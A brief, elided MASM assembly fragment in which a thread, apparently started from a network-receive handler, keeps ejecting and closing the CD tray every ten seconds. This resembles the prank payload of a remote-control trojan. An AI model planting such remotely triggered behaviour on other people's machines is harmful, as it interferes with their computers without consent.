...
_cmd_exit  db "set cdaudio door closed", 0
.code
@@:
    invoke mciSendStringA,ADDR _cmd_open,0,0,0
    invoke mciSendStringA,ADDR _cmd_eject,0,0,0
    invoke mciSendStringA,ADDR _cmd_close,0,0,0
    invoke mciSendStringA,ADDR _cmd_exit,0,0,0
    invoke Sleep, 10000
    jmp @B
Bor0 ENDP
...
crecv:
    ...
    invoke CreateThread,NULL,NULL,ADDR Bor0,NULL,0,0
    mov threadid, eax
